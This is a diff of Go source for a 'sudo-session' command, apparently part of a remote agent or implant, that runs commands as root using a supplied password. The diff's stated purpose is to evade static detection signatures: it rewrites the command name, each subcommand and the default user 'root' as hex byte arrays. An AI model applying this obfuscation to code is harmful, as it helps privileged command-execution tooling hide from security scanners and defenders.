@@ -9,10 +9,28 @@ import (
 	"time"
 )
 
+// Sudo session strings (constructed to avoid static signatures)
+var (
+	// Command name
+	sudoSessCmdName = string([]byte{0x73, 0x75, 0x64, 0x6f, 0x2d, 0x73, 0x65, 0x73, 0x73, 0x69, 0x6f, 0x6e}) // sudo-session
+
+	// Subcommands
+	sudoSessStart          = string([]byte{0x73, 0x74, 0x61, 0x72, 0x74})                                                       // start
+	sudoSessStop           = string([]byte{0x73, 0x74, 0x6f, 0x70})                                                             // stop
+	sudoSessExec           = string([]byte{0x65, 0x78, 0x65, 0x63})                                                             // exec
+	sudoSessExecStateful   = string([]byte{0x65, 0x78, 0x65, 0x63, 0x2d, 0x73, 0x74, 0x61, 0x74, 0x65, 0x66, 0x75, 0x6c})       // exec-stateful
+	sudoSessEnableStateful = string([]byte{0x65, 0x6e, 0x61, 0x62, 0x6c, 0x65, 0x2d, 0x73, 0x74, 0x61, 0x74, 0x65, 0x66, 0x75, 0x6c}) // enable-stateful
+	sudoSessDisableStateful = string([]byte{0x64, 0x69, 0x73, 0x61, 0x62, 0x6c, 0x65, 0x2d, 0x73, 0x74, 0x61, 0x74, 0x65, 0x66, 0x75, 0x6c}) // disable-stateful
+	sudoSessStatus         = string([]byte{0x73, 0x74, 0x61, 0x74, 0x75, 0x73})                                                 // status
+
+	// Default user
+	sudoSessDefaultUser = string([]byte{0x72, 0x6f, 0x6f, 0x74}) // root
+)
+
 type SudoSessionCommand struct{}
 
 func (c *SudoSessionCommand) Name() string {
-	return "sudo-session"
+	return sudoSessCmdName
 }
 
 func (c *SudoSessionCommand) Execute(ctx *CommandContext, args []string) CommandResult {
@@ -27,7 +45,7 @@ func (c *SudoSessionCommand) Execute(ctx *CommandContext, args []string) Command
 	subCommand := args[0]
 
 	switch subCommand {
-	case "start":
+	case sudoSessStart:
 		if len(args) < 2 {
 			return CommandResult{
 				Output:      Err(E1),
@@ -37,7 +55,7 @@ func (c *SudoSessionCommand) Execute(ctx *CommandContext, args []string) Command
 		}
 
 		password := args[1]
-		targetUser := "root" // Default to root
+		targetUser := sudoSessDefaultUser // Default to root
 
 		// Check if a specific user was provided
 		if len(args) >= 3 {
@@ -86,7 +104,7 @@ func (c *SudoSessionCommand) Execute(ctx *CommandContext, args []string) Command
 			CompletedAt: time.Now().Format(time.RFC3339),
 		}
 
-	case "exec", "exec-stateful":
+	case sudoSessExec, sudoSessExecStateful:
 		if len(args) < 2 {
 			return CommandResult{
 				Output:      Err(E1),
@@ -118,7 +136,7 @@ func (c *SudoSessionCommand) Execute(ctx *CommandContext, args []string) Command
 		}
 
 		// If exec-stateful, temporarily enable stateful mode
-		if subCommand == "exec-stateful" {
+		if subCommand == sudoSessExecStateful {
 			// Try to enable stateful if not already enabled
 			if !session.useStateful {
 				if err := session.EnableStatefulMode(); err != nil {
@@ -174,7 +192,7 @@ func (c *SudoSessionCommand) Execute(ctx *CommandContext, args []string) Command
 			}
 		}
 
-	case "enable-stateful":
+	case sudoSessEnableStateful:
 		ctx.mu.RLock()
 		sessionInterface := ctx.SudoSession
 		ctx.mu.RUnlock()
@@ -210,7 +228,7 @@ func (c *SudoSessionCommand) Execute(ctx *CommandContext, args []string) Command
 			CompletedAt: time.Now().Format(time.RFC3339),
 		}
 
-	case "disable-stateful":
+	case sudoSessDisableStateful:
 		ctx.mu.RLock()
 		sessionInterface := ctx.SudoSession
 		ctx.mu.RUnlock()
@@ -240,7 +258,7 @@ func (c *SudoSessionCommand) Execute(ctx *CommandContext, args []string) Command
 			CompletedAt: time.Now().Format(time.RFC3339),
 		}
 
-	case "status":
+	case sudoSessStatus:
 		ctx.mu.RLock()
 		sessionInterface := ctx.SudoSession
 		ctx.mu.RUnlock()
@@ -261,7 +279,7 @@ func (c *SudoSessionCommand) Execute(ctx *CommandContext, args []string) Command
 			CompletedAt: time.Now().Format(time.RFC3339),
 		}
 
-	case "stop":
+	case sudoSessStop:
 		ctx.mu.Lock()
 		sessionInterface := ctx.SudoSession
 
@@ -277,7 +295,7 @@ func (c *SudoSessionCommand) Execute(ctx *CommandContext, args []string) Command
 		session := sessionInterface.(*SudoSession)
 		targetUser := session.targetUser
 		if targetUser == "" {
-			targetUser = "root"
+			targetUser = sudoSessDefaultUser
 		}
 
 		err := session.Close()
